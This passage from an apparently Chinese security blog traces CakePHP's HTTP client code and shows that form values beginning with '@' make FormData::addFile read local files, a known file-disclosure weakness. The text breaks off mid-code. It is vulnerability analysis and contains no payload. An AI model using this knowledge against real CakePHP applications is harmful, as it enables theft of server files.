<span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$config = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;setConfig($config);</span><br><span class="line"></span><br><span class="line">$adapter = <span class="keyword">$this</span>-&gt;_config[<span class="string">&#x27;adapter&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;setConfig(<span class="string">&#x27;adapter&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (is_string($adapter)) &#123;</span><br><span class="line">$adapter = <span class="keyword">new</span> $adapter();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_adapter = $adapter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;_config[<span class="string">&#x27;cookieJar&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_cookies = <span class="keyword">$this</span>-&gt;_config[<span class="string">&#x27;cookieJar&#x27;</span>];</span><br><span class="line"><span class="keyword">$this</span>-&gt;setConfig(<span class="string">&#x27;cookieJar&#x27;</span>, <span class="literal">null</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_cookies = <span class="keyword">new</span> CookieCollection();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Do a GET request.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* The $data argument supports a special `_content` key</span></span><br><span class="line"><span class="comment">* for providing a request body in a GET request. This is</span></span><br><span class="line"><span class="comment">* generally not used, but services like ElasticSearch use</span></span><br><span class="line"><span class="comment">* this feature.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url The url or path you want to request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $data The query data you want to send.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options Additional options for the request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url, $data = [], <span class="keyword">array</span> $options = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$options = <span class="keyword">$this</span>-&gt;_mergeOptions($options);</span><br><span class="line">$body = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($data[<span class="string">&#x27;_content&#x27;</span>])) &#123;</span><br><span class="line">$body = $data[<span class="string">&#x27;_content&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>($data[<span class="string">&#x27;_content&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">$url = <span class="keyword">$this</span>-&gt;buildUrl($url, $data, $options);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_doRequest(</span><br><span class="line">Request::METHOD_GET,</span><br><span class="line">$url,</span><br><span class="line">$body,</span><br><span class="line">$options</span><br><span class="line">);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>post函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Do a POST request.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url The url or path you want to request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed $data The post data you want to send.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options Additional options for the request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">post</span>(<span class="params">$url, $data = [], <span class="keyword">array</span> $options = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$options = <span class="keyword">$this</span>-&gt;_mergeOptions($options);</span><br><span class="line">$url = <span class="keyword">$this</span>-&gt;buildUrl($url, [], $options);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_doRequest(Request::METHOD_POST, $url, $data, $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这两个函数最后进行请求的时候都调用了<code>$this-&gt;_doRequest(Request::METHOD_POST|Request::METHOD_GET, $url, $data, $options);</code>，继续跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Helper method for doing non-GET requests.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $method HTTP method.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url URL to request.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed $data The request body.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options The options to use. Contains auth, proxy, etc.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Response</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_doRequest</span>(<span class="params">$method, $url, $data, $options</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$request = <span class="keyword">$this</span>-&gt;_createRequest(</span><br><span class="line">$method,</span><br><span class="line">$url,</span><br><span class="line">$data,</span><br><span class="line">$options</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;send($request, $options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又调用了<code>$this-&gt;_createRequest($method,$url,$data,$options);</code>继续跟<code>_createRequest</code>看它对输入的url和data都做了什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Creates a new request object based on the parameters.</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $method HTTP method name.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> string $url The url including query string.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> mixed $data The request body.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> array $options The options to use. Contains auth, proxy, etc.</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> \Cake\Http\Client\Request</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_createRequest</span>(<span class="params">$method, $url, $data, $options</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">$headers = <span class="keyword">isset</span>($options[<span class="string">&#x27;headers&#x27;</span>]) ? (<span class="keyword">array</span>)$options[<span class="string">&#x27;headers&#x27;</span>] : [];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">&#x27;type&#x27;</span>])) &#123;</span><br><span class="line">$headers = array_merge($headers, <span class="keyword">$this</span>-&gt;_typeHeaders($options[<span class="string">&#x27;type&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (is_string($data) &amp;&amp; !<span class="keyword">isset</span>($headers[<span class="string">&#x27;Content-Type&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($headers[<span class="string">&#x27;content-type&#x27;</span>])) &#123;</span><br><span class="line">$headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$request = <span class="keyword">new</span> Request($url, $method, $headers, $data);</span><br><span class="line">$cookies = <span class="keyword">isset</span>($options[<span class="string">&#x27;cookies&#x27;</span>]) ? $options[<span class="string">&#x27;cookies&#x27;</span>] : [];</span><br><span class="line"><span class="comment">/** <span class="doctag">@var</span> \Cake\Http\Client\Request $request */</span></span><br><span class="line">$request = <span class="keyword">$this</span>-&gt;_cookies-&gt;addToRequest($request, $cookies);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">&#x27;auth&#x27;</span>])) &#123;</span><br><span class="line">$request = <span class="keyword">$this</span>-&gt;_addAuthentication($request, $options);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($options[<span class="string">&#x27;proxy&#x27;</span>])) &#123;</span><br><span class="line">$request = <span class="keyword">$this</span>-&gt;_addProxy($request, $options);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> $request;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第20行在请求的时候创建了一个Request对象进行请求<code>new Request($url, $method, $headers, $data);</code><br>Request类位于<code>\Cake\Http\Client\Request</code>，在<code>\vendor\cakephp\cakephp\src\Http\Client\Request.php</code>中，继续跟进</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span> <span class="keyword">extends</span> <span class="title">Message</span> <span class="keyword">implements</span> <span class="title">RequestInterface</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">RequestTrait</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Provides backwards compatible defaults for some properties.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $url The request URL</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $method The HTTP method to use.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $headers The HTTP headers to set.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array|string|null $data The request body to use.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$url = <span class="string">&#x27;&#x27;</span>, $method = <span class="built_in">self</span>::METHOD_GET, <span class="keyword">array</span> $headers = [], $data = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;validateMethod($method);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uri = <span class="keyword">$this</span>-&gt;createUri($url);</span><br><span class="line">        $headers += [</span><br><span class="line">            <span class="string">&#x27;Connection&#x27;</span> =&gt; <span class="string">&#x27;close&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span> =&gt; <span class="string">&#x27;CakePHP&#x27;</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;addHeaders($headers);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;body($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get/set the body/payload for the message.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Array data will be serialized with Cake\Http\FormData,</span></span><br><span class="line"><span class="comment">     * and the content-type will be set.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string|array|null $body The body for the request. Leave null for get</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> mixed Either $this or the body value.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">body</span>(<span class="params">$body = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($body === <span class="literal">null</span>) &#123;</span><br><span class="line">            $body = <span class="keyword">$this</span>-&gt;getBody();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $body ? $body-&gt;__toString() : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (is_array($body)) &#123;</span><br><span class="line">            $formData = <span class="keyword">new</span> FormData();</span><br><span class="line">            $formData-&gt;addMany($body);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;header(<span class="string">&#x27;Content-Type&#x27;</span>, $formData-&gt;contentType());</span><br><span class="line">            $body = (<span class="keyword">string</span>)$formData;</span><br><span class="line">        &#125;</span><br><span class="line">        $stream = <span class="keyword">new</span> Stream(<span class="string">&#x27;php://memory&#x27;</span>, <span class="string">&#x27;rw&#x27;</span>);</span><br><span class="line">        $stream-&gt;write($body);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;stream = $stream;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在第25行的构造函数中使用<code>$this-&gt;body($data)</code>将data放在了body中，而在body函数中有一行代码判断data是否为数组，body函数的文档中还提到了<code>Array data will be serialized with Cake\Http\FormData</code>,也就是说如果是数组的话会new一个FormData对象，并且将data添加到FormData中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (is_array($body)) &#123;</span><br><span class="line"> $formData = <span class="keyword">new</span> FormData();</span><br><span class="line"> $formData-&gt;addMany($body);</span><br><span class="line"> <span class="keyword">$this</span>-&gt;header(<span class="string">&#x27;Content-Type&#x27;</span>, $formData-&gt;contentType());</span><br><span class="line"> $body = (<span class="keyword">string</span>)$formData;</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>跟到FormData中，位于Cake\Http\FormData</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FormData</span> <span class="keyword">implements</span> <span class="title">Countable</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add a new part to the data.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The value for a part can be a string, array, int,</span></span><br><span class="line"><span class="comment">     * float, filehandle, or object implementing __toString()</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * If the $value is an array, multiple parts will be added.</span></span><br><span class="line"><span class="comment">     * Files will be read from their current position and saved in memory.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string|\Cake\Http\Client\FormData $name The name of the part to add,</span></span><br><span class="line"><span class="comment">     *   or the part data object.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $value The value for the part.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> $this</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">$name, $value = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addRecursive($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_resource($value)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[<span class="number">0</span>] === <span class="string">&#x27;@&#x27;</span>) &#123;</span><br><span class="line">            trigger_error(</span><br><span class="line">                <span class="string">&#x27;Using the @ syntax for file uploads is not safe and is deprecated. &#x27;</span> .</span><br><span class="line">                <span class="string">&#x27;Instead you should use file handles.&#x27;</span>,</span><br><span class="line">                E_USER_DEPRECATED</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($name <span class="keyword">instanceof</span> FormDataPart &amp;&amp; $value === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_hasComplexPart = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_parts[] = $name;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_parts[] = <span class="keyword">$this</span>-&gt;newPart($name, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add multiple parts at once.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * Iterates the parameter and adds all the key/values.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $data Array of data to add.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> $this</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addMany</span>(<span class="params"><span class="keyword">array</span> $data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;add($name, $value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Add either a file reference (string starting with @)</span></span><br><span class="line"><span class="comment">     * or a file handle.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $name The name to use.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $value Either a string filename, or a filehandle.</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> \Cake\Http\Client\FormDataPart</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addFile</span>(<span class="params">$name, $value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_hasFile = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        $filename = <span class="literal">false</span>;</span><br><span class="line">        $contentType = <span class="string">&#x27;application/octet-stream&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_resource($value)) &#123;</span><br><span class="line">            $content = stream_get_contents($value);</span><br><span class="line">            <span class="keyword">if</span> (stream_is_local($value)) &#123;</span><br><span class="line">                $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">                $metadata = stream_get_meta_data($value);</span><br><span class="line">                $contentType = $finfo-&gt;file($metadata[<span class="string">&#x27;uri&#x27;</span>]);</span><br><span class="line">                $filename = basename($metadata[<span class="string">&#x27;uri&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $finfo = <span class="keyword">new</span> finfo(FILEINFO_MIME);</span><br><span class="line">            $value = substr($value, <span class="number">1</span>);</span><br><span class="line">            $filename = basename($value);</span><br><span class="line">            $content = file_get_contents($value);</span><br><span class="line">            $contentType = $finfo-&gt;file($value);</span><br><span class="line">        &#125;</span><br><span class="line">        $part = <span class="keyword">$this</span>-&gt;newPart($name, $content);</span><br><span class="line">        $part-&gt;type($contentType);</span><br><span class="line">        <span class="keyword">if</span> ($filename) &#123;</span><br><span class="line">            $part-&gt;filename($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;add($part);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $part;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>addMany($body)</code>函数中将data数组进行了处理，将data数组里的每一个键和值都用<code>$this-&gt;add($name, $value)</code>加入到body中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> ($data <span class="keyword">as</span> $name =&gt; $value) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;add($name, $value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看add函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">$name, $value = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (is_array($value)) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;addRecursive($name, $value);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (is_resource($value)) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[<span class="number">0</span>] === <span class="string">&#x27;@&#x27;</span>) &#123;</span><br><span class="line">trigger_error(</span><br><span class="line"><span class="string">&#x27;Using the @ syntax for file uploads is not safe and is deprecated. &#x27;</span> .</span><br><span class="line"><span class="string">&#x27;Instead you should use file handles.&#x27;</span>,</span><br><span class="line">E_USER_DEPRECATED</span><br><span class="line">);</span><br><span class="line"><span class="keyword">$this</span>-&gt;addFile($name, $value);</span><br><span class="line">&#125; <span class="keyword">elseif</span> ($name <span class="keyword">instanceof</span> FormDataPart &amp;&amp; $value === <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_hasComplexPart = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_parts[] = $name;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;_parts[] = <span class="keyword">$this</span>-&gt;newPart($name, $value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在add函数中第7行代码出了问题<br><code>elseif (is_string($value) &amp;&amp; strlen($value) &amp;&amp; $value[0] === &#39;@&#39;)</code><br>如果value是”@”开头的字符串的话会转入<code>addFile</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 